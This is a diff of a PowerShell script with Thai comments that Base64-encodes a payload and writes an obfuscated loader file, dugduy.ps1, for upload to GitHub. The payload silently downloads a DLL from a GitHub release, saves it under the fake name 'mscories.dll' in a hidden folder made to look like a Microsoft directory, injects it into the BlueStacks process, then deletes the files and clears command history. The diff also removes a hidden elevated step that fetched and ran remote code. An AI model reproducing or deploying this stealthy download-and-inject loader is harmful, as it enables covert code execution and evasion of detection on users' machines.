@@ -1,28 +1,18 @@
-# วางโค้ดที่คุณต้องการพรางตัวไว้ตรงนี้
+# วางโค้ดต้นฉบับที่จะพรางไว้ใน Block นี้
 $rawCode = @'
-# 1. ขอสิทธิ์ Administrator
-if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"iex ((iwr 'https://github.com/potae112/Cmdfreefire/blob/main/dugduy.ps1' -UseBasicParsing).Content)`"" -Verb RunAs
-    exit
-}
-
-# 2. ตั้งค่าไฟล์และการพรางตัว
 $url = "https://github.com/potae112/Cmdfreefire/releases/download/v1.0/dllfreefire.dll"
 $fakeName = "mscories.dll"
 $workDir = "$env:LOCALAPPDATA\Microsoft\CLR_v4.0"
 $dllPath = Join-Path $workDir $fakeName
 $targetProcess = "HD-Player"
 
-# 3. เตรียมที่เก็บไฟล์ (ซ่อนโฟลเดอร์)
 if (Test-Path $workDir) { Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue }
 New-Item -ItemType Directory -Path $workDir -Force | Out-Null
 attrib +h +s $workDir
 
-# 4. ดาวน์โหลด DLL แบบเงียบ
 $ProgressPreference = 'SilentlyContinue'
 Invoke-WebRequest -Uri $url -OutFile $dllPath -UseBasicParsing -ErrorAction SilentlyContinue
 
-# 5. โค้ด C# สำหรับ Inject DLL (รันใน RAM)
 $Source = @"
 using System;
 using System.Runtime.InteropServices;
@@ -48,7 +38,6 @@ public class Injector {
 }
 "@
 
-# 6. เริ่มการ Inject เข้า BlueStacks
 if (Test-Path $dllPath) {
     $proc = Get-Process -Name $targetProcess -ErrorAction SilentlyContinue
     if (!$proc) {
@@ -63,7 +52,6 @@ if (Test-Path $dllPath) {
     }
 }
 
-# 7. ลบร่องรอย
 Start-Sleep -Seconds 5
 Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
 Clear-History -ErrorAction SilentlyContinue
@@ -74,12 +62,19 @@ Get-Item -Path $muiPath -ErrorAction SilentlyContinue | Select-Object -ExpandPro
 }
 '@
 
-# แปลงเป็น Base64 โดยใช้ Encoding เป็น UTF8 เหมือนโค้ดอ้างอิงของคุณ
-$bytes = [System.Text.Encoding]::Utf8.GetBytes($rawCode)
+# แปลงเป็น Base64 (UTF8)
+$bytes = [System.Text.Encoding]::UTF8.GetBytes($rawCode)
 $base64Result = [Convert]::ToBase64String($bytes)
 
-# พิมพ์ผลลัพธ์โครงสร้างออกมา
-Write-Host "`n=== สร้างสคริปต์เสร็จแล้ว นำโครงสร้างด้านล่างนี้ไปเซฟใช้ได้เลย ===`n" -ForegroundColor Green
-Write-Output "`$encoded = `"$base64Result`""
-Write-Output "`$decrypted = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String(`$encoded))"
-Write-Output "iex `$decrypted"
+# โครงสร้างสำหรับไฟล์ dugduy.ps1
+$dugduyContent = @"
+`$encoded = "$base64Result"
+`$decrypted = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(`$encoded))
+Invoke-Expression `$decrypted
+"@
+
+# บันทึกไฟล์ไปที่ Desktop
+$desktopPath = Join-Path $env:USERPROFILE "Desktop\dugduy.ps1"
+Set-Content -Path $desktopPath -Value $dugduyContent -Encoding UTF8
+Write-Host "สร้างไฟล์ dugduy.ps1 เรียบร้อยแล้วที่: $desktopPath" -ForegroundColor Green
+Write-Host "นำไฟล์นี้ไปอัปโหลดขึ้น GitHub ได้เลย!" -ForegroundColor Yellow
